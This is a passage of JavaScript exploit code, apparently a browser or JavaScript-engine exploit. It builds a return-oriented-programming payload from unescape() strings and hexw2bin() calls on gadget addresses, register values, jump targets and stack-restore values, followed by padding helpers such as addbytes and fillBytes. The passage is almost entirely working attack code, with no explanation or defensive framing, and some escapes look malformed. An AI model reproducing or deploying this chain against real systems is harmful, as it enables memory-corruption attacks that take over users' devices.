7\u58F9\u1AFB\u1CFD\u1EFF\u3FFF\u1000\u1101\u1304\u4506\u4708\u5910\u5555\u1314\u1516\u1718\u6910\u6666\u1314\u1516")+hexw2bin(pad4)+hexw2bin(a25_r11)+unescape("\u1536\u1738\u1940\u1141\u3344\u1546\u1748\u1950\u1151\u1354\u1556\u3758\u1960\u1161\u1364\u1566\u1768\u3970\u1171\u1374\u1576\u1778\u1980\u1181\u1384\u1586\u1788\u3990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF\u40B1\u11B3\u14B5\u26B7")+hexw2bin(a25_r11)+unescape("\u1CBD\u1EBF\u50C1\u11C3\u44C5\u46C7\u48C9\u1ACB\u1CCD\u1ECF\u30D1\u11D3\u14D5\u16D7\u68D9\u1ADB\u6CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a24_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB\uF9FD\uFEFF\uFFFF\uF000\uF402\uFF04\uF506\uF708\uF910\uF112\uFF14\uF516\uC718\uF920\uF122\uFF24\uF826\uF728\uFDF0\uF1F2\u3FF4\uF5F6\uF7F8\uF940\uF142\uFF44\uF446\uF748\uF350\uF152\uFF54\uF556\uF758\uF960\uF162\uFF64\uF566\uF768\uF970\uF172\uFF74\uF576")+hexw2bin(pad4)+hexw2bin(a25_r3)+hexw2bin(pad4)+hexw2bin(a25_r30)+hexw2bin(pad4)+hexw2bin(a25_r31)+unescape("\uF4A1\uF2A3\uF4A5\uF6A7\u48A9\uFAAB\uFCAD\uFEAF")+hexw2bin(pad4)+hexw2bin(a25_jumpto)+unescape("\u38B9\u0ABB\u0CBD\u0EBF\u30C1\u02C3\u00C5\u36C7\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7\u38D9\u0ADB\u0CDD\u0EDF\u30E1\u02E3\u00E5\u06E7\u48E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u36F7\u58F9\u4AFB\u0CFD\u0EFF\u6FFF\u0102\u0300\u0D06\u0708\u0910\u0112\u3310\u0516\u0718")+hexw2bin(a26_r11)+hexw2bin(a26_r10)+hexw2bin(a26_r8)+hexw2bin(a26_r7)+hexw2bin(a26_r6)+hexw2bin(a26_r5)+hexw2bin(a26_r4)+unescape("\u4748\u0950")+hexw2bin(a26_r9)+unescape("\u0556\u0758\u0960\u0162\u0364\u0566\u0768\u0970")+hexw2bin(pad4)+hexw2bin(a26_r3)+hexw2bin(pad4)+hexw2bin(a26_r30)+hexw2bin(pad4)+hexw2bin(a26_r31)+hexw2bin(pad4)+hexw2bin(restore_stack7)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a26_jumpto)+unescape("\u78D9\u1ADB\u7CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u68E9\u1AEB\u5CED\u1EEF\u10F1\u11F3\u54F5\u16F7\u68F9\u1AFB\u1CFD\u1EFF\u6FFF\u1000\u1101\u1304\u5506\u5708\u1910\u7777\u1314\u1516\u1718\u7910\u8888\u1314\u1516\u1718\u1930\u4131\u5334\u1536\u1738\u1940\u1141\u4344\u1546\u1748\u1950\u1151\u1354\u1556\u4758\u1960\u1161\u1364\u1566\u1768\u4970\u1171\u1374\u1576\u1778\u1980\u1181\u1384\u1586\u1788\u4990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF\u10B1\u11B3\u14B5\u36B7\u48B9\u1ABB\u1CBD\u1EBF\u60C1\u11C3\u54C5\u56C7\u58C9\u1ACB\u1CCD\u1ECF\u40D1\u11D3\u14D5\u16D7\u88D9\u1ADB\u8CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a27_jumpto)+unescape("\uA0F1\uA2F3\uA4F5\uA6F7\uA8F9\uAAFB\uACFD\uAEFF\uAFFF\uA000\uA102\uA304\uA506\uA708\uA910\uA112\uA314\uA516\uA718\uA920\uA122\uA324\uA526\uA728\uA930\uA132\uA334\uA536\uA738\uA940\uA142\uA344\uA546\uA748\uA950\uA152\uA354\uA556\uA758\uA960\uA162\uA364\uA566\uA768\uA970\uA172\uA374\uA576")+hexw2bin(pad4)+hexw2bin(a28_r3)+hexw2bin(pad4)+hexw2bin(a28_r30)+hexw2bin(pad4)+hexw2bin(a28_r31)+unescape("\uA0A1\uA2A3\uA4A5\uA6A7\uA8A9\uAAAB\uACAD\uAEAF")+hexw2bin(pad4)+hexw2bin(a28_jumpto)+unescape("\u98B9\uBABB\uBCBD\uBEBF\uB0C1\uB2C3\uB4C5\uB6C7\uB8C9\uBACB\uBCCD\uBECF\uB0D1\uB2D3\uB4D5\uB6D7\uB8D9\uBADB\uBCDD\uBEDF\uB0E1\uB2E3\uB4E5\uB6E7\uB8E9\uBAEB\uBCED\uBEEF\uB0F1\uB2F3\uB4F5\uB6F7\uB8F9\uBAFB\uBCFD\uBEFF\uBFFF\uB102\uB304\uB506\uB708\uB910\uB112\uB314\uB516\uB718")+hexw2bin(a29_r11)+hexw2bin(a29_r10)+hexw2bin(a29_r8)+hexw2bin(a29_r7)+hexw2bin(a29_r6)+hexw2bin(a29_r5)+hexw2bin(a29_r4)+unescape("\uB748\uB950")+hexw2bin(a29_r9)+unescape("\uB556\uB758\uB960\uB162\uB364\uB566\uB768\uB970")+hexw2bin(pad4)+hexw2bin(a29_r3)+hexw2bin(pad4)+hexw2bin(a29_r30)+hexw2bin(pad4)+hexw2bin(a29_r31)+hexw2bin(pad4)+hexw2bin(restore_stack)+unescape("\uA2A3\uA4A5\uA6A7\uA8A9")+hexw2bin(pad4)+hexw2bin(a29_jumpto)+unescape("\uC8D9\uCADB\uCCDD\uCEDF\uC0E1\uC2E3\uC4E5\uC6E7\uC8E9\uCAEB\uCCED\uCEEF\uC0F1\uC2F3\uC4F5\uC6F7\uC8F9\uCAFB\uCCFD\uCEFF\uCFFF\uC000\uC102\uC304\uC506\uC708\uC910\uC112\uC314\uC516\uC718\uC920\uC122\uC324\uC526\uC728\uC930\uC132\uC334\uC536\uC738\uC940\uC142\uC344\uC546\uC748\uC950\uC152\uC354\uC556\uC758\uC960\uC162\uC364\uC566\uC768\uC970\uC172\uC374\uC576\uC778\uC980\uC182\uC384\uC586\uC788\uC990\uC192\uC394\uC596\uC798\uC900\uC0A1\uC2A3\uC4A5\uC6A7\u68A9\uCAAB\uCCAD\uCEAF\uC0B1\uC2B3\uC4B5\uC6B7\uC8B9\uCABB\uCCBD\uCEBF\uC0C1\uC2C3\uC4C5\uC6C7\uC8C9\uCACB\uCCCD\uCECF\uC0D1\uC2D3\uC4D5\uC6D7\uC8D9\uCADB\uCCDD\uCEDF\uC0E1\uC2E3\uC4E5\uC6E7")+hexw2bin(pad4)+hexw2bin(a30_jumpto)+unescape("\uD0F1\uD2F3\uD4F5\uD6F7\uD8F9\uDAFB\uDCFD\uDEFF\uDFFF\uD000\uD102\uD304\uD506\uD708\uD910\uD112\uD314\uD516\uD718\uD920\uD122\uD324\uD526\uD728\uD930\uD132\uD334\uD536\uD738\uD940\uD142\uD344\uD546\uD748\uD950\uD152\uD354\uD556\uD758\uD960\uD162\uD364\uD566\uD768\uD970\uD172\uD374\uD576")+hexw2bin(pad4)+hexw2bin(a31_r3)+hexw2bin(pad4)+hexw2bin(a31_r30)+hexw2bin(pad4)+hexw2bin(a31_r31)+unescape("\uD0A1\uD2A3\uD4A5\uD6A7\uD8A9\uDAAB\uDCAD\uDEAF")+hexw2bin(pad4)+hexw2bin(a31_jumpto)+unescape("\u98B9\uEABB\uECBD\uEEBF\uE0C1\uE2C3\uE4C5\uE6C7\uE8C9\uEACB\uECCD\uEECF\uE0D1\uE2D3\uE4D5\uE6D7\uE8D9\uEADB\uECDD\uEEDF\uE0E1\uE2E3\uE4E5\uE6E7\uE8E9\uEAEB\uECED\uEEEF\uE0F1\uE2F3\uE4F5\uE6F7\uE8F9\uEAFB\uECFD\uEEFF\uEFFF\uE102\uE304\uE506\uE708\uE910\uE112\uE314\uE516\uE718")+hexw2bin(a32_r11)+hexw2bin(a32_r10)+hexw2bin(a32_r8)+hexw2bin(a32_r7)+hexw2bin(a32_r6)+hexw2bin(a32_r5)+hexw2bin(a32_r4)+unescape("\uE748\uE950")+hexw2bin(a32_r9)+unescape("\uE556\uE758\uE960\uE162\uE364\uE566\uE768\uE970")+hexw2bin(pad4)+hexw2bin(a32_r3)+hexw2bin(pad4)+hexw2bin(a32_r30)+hexw2bin(pad4)+hexw2bin(a32_r31)+hexw2bin(pad4)+hexw2bin(restore_stack)+unescape("\uD2A3\uD4A5\uD6A7\uD8A9")+hexw2bin(pad4)+hexw2bin(a32_jumpto)+unescape("\uF8D9\uFADB\uFCDD\uFEDF\uF0E1\uF2E3\uF4E5\uF6E7\uF8E9\uFAEB\uFCED\uFEEF\uF0F1\uF2F3\uF4F5\uF6F7\uF8F9\uFAFB\uFCFD\uFEFF\uFFFF\uF000\uF102\uF304\uF506\uF708\uF910\uF112\uF314\uF516\uF718\uF920\uF122\uF324\uF526\uF728\uF930\uF132\uF334\uF536\uF738\uF940\uF142\uF344\uF546\uF748\uF950\uF152\uF354\uF556\uF758\uF960\uF162\uF364\uF566\uF768\uF970\uF172\uF374\uF576\uF778\uF980\uF182\uF384\uF586\uF788\uF990\uF192\uF394\uF596\uF798\uF900\uF0A1\uF2A3\uF4A5\uF6A7\u68A9\uFAAB\uFCAD\uFEAF\uF0B1\uF2B3\uF4B5\uF6B7\uF8B9\uFABB\uFCBD\uFEBF\uF0C1\uF2C3\uF4C5\uF6C7\uF8C9\uFACB\uFCCD\uFECF\uF0D1\uF2D3\uF4D5\uF6D7\uF8D9\uFADB\uFCDD\uFEDF\uF0E1\uF2E3\uF4E5\uF6E7")+hexw2bin(pad4)+hexw2bin(a33_jumpto));
}

function syscallGadgetSetEndBytes()
{
	return unescape("\u0000\uBE7E");
}

function addbytes(size)
{
	switch(size)
	{
		case 2:
		return unescape("\4141");
		break;
		case 4:
		return unescape("\4141\u4242");
		break;
		case 8:
		return unescape("\4141\u4242\u4343\u4444");
		break;
		case 16:
		return unescape("\4141\u4242\u4343\u4444\4545\u4646\u4747\u4848");
		break;
	}
}

function checkNbytes(nbytes)
{
	if(nbytes%2!==0){throw "fill_by_Xbytes functions cannot use nbytes = 0x"+nbytes.toString(16)+". nbytes must be set to an even value.";}
}

function fillBytes(chunksize,nbytes,hex_val)
{
	//if(chunksize===2){}
	if(chunksize===4){hex_val=2}
	if(chunksize===6){hex_val=3}
	if(chunksize===8){hex_val=4}
	if(chunksize===10){hex_val=5}
	if(chunksize===12){hex_val=6}
	if(chunksize===14){hex_val=7}
	if(chunksize===16){hex_val=8}
	if(chunksize===18){hex_val=9}
	if(chunksize===20){hex_val=10}
	if(chunksize===22){hex_val=11}
	if(chunksize===24){hex_val=12}
	if(chunksize===26){hex_val=13}
	if(chunksize===28){hex_val=14}
	if(chunksize===30){hex_val=15}
	if(chunksize===32){hex_val=16}
	checkNbytes(nbytes);
	var stemp='';var iterator=0;
	while(iterator<nbytes/chunksize){stemp+=hexh2bin(hex_val);iterator++;}
	return stemp;
}